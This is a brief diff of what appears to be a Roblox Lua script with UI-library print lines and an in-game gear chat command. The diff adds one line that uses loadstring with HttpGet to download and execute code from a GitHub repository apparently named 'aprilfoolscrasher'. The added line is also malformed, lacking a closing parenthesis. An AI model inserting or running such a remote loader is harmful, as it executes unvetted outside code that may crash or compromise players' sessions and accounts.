@@ -228,3 +228,4 @@ print("cofead(the welcome message)")
 print("sirus ui lib maker")
 
 game.Players:Chat("gear me 000000000000000000094794847")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aprilfoolscrasher/antiabuse/main/antiabuse")
